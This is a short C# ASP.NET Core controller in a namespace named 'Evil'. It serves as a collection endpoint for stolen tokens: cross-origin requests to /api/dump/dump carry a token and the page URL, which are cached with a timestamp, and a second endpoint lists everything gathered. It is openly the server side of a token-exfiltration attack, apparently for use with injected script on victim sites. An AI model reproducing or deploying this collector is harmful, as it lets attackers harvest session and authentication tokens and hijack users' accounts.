using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Caching.Memory;
using Microsoft.AspNetCore.Cors;

namespace Evil.Controllers
{
    [Route("api/[controller]")]
    public class DumpController : Controller
    {
        public class Dump
        {
            public string Token { get; set; }
            public string Url { get; set; }
            public DateTime LogTime {get;set;}
        }
        private readonly IMemoryCache cache;
        private const string CacheKey = "Dumps";
        public DumpController(IMemoryCache cache)
        {
            this.cache = cache;
        }
        [EnableCors("AllowAll")]
        [HttpGet("dump")]
        public async Task DumpToken(string token, string url)
        {
            List<Dump> cachedDumps;
            if(!cache.TryGetValue(CacheKey, out cachedDumps))
            {
                cachedDumps = new List<Dump>();
            }

            cachedDumps.Add(new Dump
            {
                Token = token,
                Url = url,
                LogTime = DateTime.Now
            });

            var cacheEntryOptions = new MemoryCacheEntryOptions()
            .SetSlidingExpiration(TimeSpan.FromMinutes(15));

            cache.Set(CacheKey, cachedDumps);
        }

        [HttpGet("")]
        public async Task<List<Dump>> GetDumps()
        {
            List<Dump> cachedDumps;
            if(!cache.TryGetValue(CacheKey, out cachedDumps))
            {
                cachedDumps = new List<Dump>();
            }

            return cachedDumps;
        }
    }
}
